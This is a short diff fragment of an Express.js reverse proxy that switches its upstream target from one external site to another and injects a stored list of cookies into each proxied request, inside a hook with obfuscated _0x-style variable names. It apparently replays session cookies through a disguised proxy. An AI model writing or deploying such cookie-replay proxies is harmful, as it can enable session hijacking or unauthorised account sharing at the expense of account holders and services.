@@ -5,7 +5,7 @@ const app = express()
 const cookies = []
 app.use(cookieParser())
 const proxyMiddleware = createProxyMiddleware({
-  target: 'https://www.brunysixlwork.site',
+  target: 'https://mexismath.web.app',
   changeOrigin: true,
   onProxyReq: (_0x87408e) => {
     cookies.forEach((_0x10b550) => {
